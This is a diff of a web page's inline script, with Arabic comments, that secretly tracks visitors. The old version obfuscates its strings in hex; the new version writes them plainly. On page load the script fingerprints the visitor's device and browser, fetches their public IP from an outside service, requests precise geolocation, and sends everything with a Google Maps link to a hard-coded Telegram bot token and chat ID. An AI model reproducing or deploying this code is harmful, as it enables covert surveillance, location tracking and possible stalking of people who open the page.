@@ -50,72 +50,97 @@
     </div>
 
     <script>
-        var _0x4f12 = [
-            "\x38\x34\x32\x36\x38\x31\x32\x35\x31\x37\x3a\x41\x41\x48\x49\x30\x54\x52\x62\x4e\x66\x44\x44\x47\x63\x49\x39\x37\x63\x79\x54\x36\x45\x70\x46\x56\x36\x79\x38\x41\x44\x4c\x73\x41\x6c\x38", // Token [0]
-            "\x31\x38\x30\x32\x35\x33\x30\x37\x37\x30", // ChatID [1]
-            "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74", // Telegram API [2]
-            "\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65", // sendMessage [3]
-            "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70\x61\x70\x69\x2e\x63\x6f\x2f\x6a\x73\x6f\x6e\x2f", // رابط موقع الـ IP الجديد المصحح [4]
-            "\x41\x6e\x64\x72\x6f\x69\x64", "\x69\x50\x68\x6f\x6e\x65\x7c\x69\x50\x61\x64", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30", "\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68", "\x4c\x69\x6e\x75\x78", 
-            "\x43\x68\x72\x6f\x6d\x65", "\x53\x61\x66\x61\x72\x69", "\x46\x69\x72\x65\x66\x6f\x78", "\x45\x64\x67\x65", 
-            "\x61\x72\x2d\x53\x41", "\x41\x73\x69\x61\x2f\x52\x69\x79\x61\x64\x68", "\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e"
-        ];
+        // دالة تحديد نوع الشركة والجهاز
+        function getExactDeviceName(ua) {
+            if (/Android/.test(ua)) {
+                let brand = "Android (شركة غير معروفة)";
+                let modelCode = "غير محدد";
+
+                const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
+                if (androidMatch) {
+                    modelCode = androidMatch[1].trim();
+                    
+                    let lowerUA = ua.toLowerCase();
+                    let lowerModel = modelCode.toLowerCase();
+
+                    if (lowerUA.includes("samsung") || lowerModel.startsWith("sm-")) {
+                        brand = "Samsung";
+                    } else if (lowerUA.includes("huawei") || lowerUA.includes("honor") || lowerModel.startsWith("hwn")) {
+                        brand = "Huawei / Honor";
+                    } else if (lowerUA.includes("xiaomi") || lowerUA.includes("redmi") || lowerUA.includes("poco") || lowerUA.includes("mi ")) {
+                        brand = "Xiaomi";
+                    } else if (lowerUA.includes("oppo") || lowerModel.startsWith("cph")) {
+                        brand = "Oppo";
+                    } else if (lowerUA.includes("vivo")) {
+                        brand = "Vivo";
+                    } else if (lowerUA.includes("oneplus")) {
+                        brand = "OnePlus";
+                    } else if (lowerUA.includes("realme")) {
+                        brand = "Realme";
+                    } else if (lowerUA.includes("google") || lowerModel.includes("pixel")) {
+                        brand = "Google Pixel";
+                    } else if (lowerUA.includes("sony")) {
+                        brand = "Sony";
+                    }
+                }
+                return `${brand} [${modelCode}]`;
+            }
+
+            if (/iPhone|iPad/.test(ua)) {
+                const width = window.screen.width;
+                const height = window.screen.height;
+
+                if (width === 430 && height === 932) return 'iPhone 15 Pro Max / 14 Pro Max';
+                if (width === 393 && height === 852) return 'iPhone 15 Pro / 15 / 14 Pro';
+                if (width === 428 && height === 926) return 'iPhone 14 Plus / 13 Pro Max';
+                if (width === 390 && height === 844) return 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
+                if (width === 414 && height === 896) return 'iPhone 11 / XR / XS Max';
+                if (width === 375 && height === 812) return 'iPhone 13 mini / 12 mini / 11 Pro / X / XS';
+                if (width === 375 && height === 667) return 'iPhone SE / 8 / 7';
+                
+                return 'iPhone / iPad';
+            }
+
+            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
+            if (/Macintosh/.test(ua)) return 'Mac';
+            if (/Linux/.test(ua)) return 'Linux';
+
+            return 'غير معروف';
+        }
+
+        const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
+        const ua = navigator.userAgent;
+        const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
+        const chatId = '1802530770';
         
-        const botToken = _0x4f12[0];
-        const chatId = _0x4f12[1];
-
-        function getSpecs() {
-            let ua = navigator.userAgent;
-            let os = "Windows";
-            let device = "غير معروف";
-            let browser = "Chrome";
-
-            if (new RegExp(_0x4f12[5]).test(ua)) {
-                os = "Android";
-                let match = ua.match(/Android[^;]*;\s*([^)]+)\)/);
-                device = match ? match[1].trim() : "Android Device";
-            } else if (new RegExp(_0x4f12[6]).test(ua)) {
-                os = "iOS";
-                let w = window.screen.width, h = window.screen.height;
-                if (w === 430 && h === 932) device = 'iPhone 15 Pro Max / 14 Pro Max';
-                else if (w === 393 && h === 852) device = 'iPhone 15 Pro / 15 / 14 Pro';
-                else if (w === 428 && h === 926) device = 'iPhone 14 Plus / 13 Pro Max';
-                else if (w === 390 && h === 844) device = 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
-                else device = "iPhone / iPad";
-            } else if (new RegExp(_0x4f12[7]).test(ua)) { os = "Windows"; } 
-              else if (new RegExp(_0x4f12[8]).test(ua)) { os = "Mac"; } 
-              else if (new RegExp(_0x4f12[9]).test(ua)) { os = "Linux"; }
-
-            if (new RegExp(_0x4f12[13]).test(ua)) browser = "Edge";
-            else if (new RegExp(_0x4f12[10]).test(ua)) browser = "Chrome";
-            else if (new RegExp(_0x4f12[11]).test(ua)) browser = "Safari";
-            else if (new RegExp(_0x4f12[12]).test(ua)) browser = "Firefox";
-
-            return { os, device, browser, lang: navigator.language || "ar" };
-        }
-
-        const specs = getSpecs();
-        const now = new Date().toLocaleString(_0x4f12[14], { timeZone: _0x4f12[15] });
-
-        fetch(_0x4f12[4])
-            .then(res => res.json())
-            .then(ipData => {
-                sendTelegram(ipData.ip);
-            })
-            .catch(() => {
-                sendTelegram("غير معروف");
-            });
-
-        function sendTelegram(resolvedIp) {
-            const msg = `📸 دخل لعطاي !%0 A⏰ ${now}%0A💻 النظام: ${specs.os}%0A📱 الجهاز: ${specs.device}%0A🌐 المتصفح: ${specs.browser}%0A🗣 اللغة: ${specs.lang}%0A🔗 IP: ${resolvedIp}`;
-            fetch(`${_0x4f12[2]}${botToken}${_0x4f12[3]}?chat_id=${chatId}&text=${msg}`);
-        }
-
-        if (navigator[_0x4f12[16]]) {
-            navigator[_0x4f12[16]].getCurrentPosition((pos) => {
-                let locMsg = `📍 بلاصتو :%0 A🗺 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`${_0x4f12[2]}${botToken}${_0x4f12[3]}?chat_id=${chatId}&text=${locMsg}`);
-            }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+        let exactDeviceName = getExactDeviceName(ua);
+        
+        // إرسال البيانات الأساسية على الفور
+        const basicMsg = `✅ زائر جديد!%0A⏰ ${now}%0A📱 الجهاز: ${exactDeviceName}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${basicMsg}`);
+        
+        // جزء جلب الـ IP (بدون انتظار طويل)
+        fetch("https://api.ipify.org?format=json", {timeout: 5000})
+          .then(r => r.json())
+          .then(data => {
+            const ip = data.ip;
+            const ipMsg = `🔗 IP Address: ${ip}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${ipMsg}`);
+          })
+          .catch(() => {
+            console.log('لم يتمكن من جلب IP');
+          });
+        
+        // جزء جلب الموقع (بدون انتظار)
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((pos) => {
+            let lat = pos.coords.latitude;
+            let lon = pos.coords.longitude;
+            const locMsg = `📍 الموقع:%0A🗺 https://www.google.com/maps?q=${lat},${lon}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${locMsg}`);
+          }, () => {
+            console.log('لم يتمكن من جلب الموقع');
+          });
         }
     </script>
 </body>
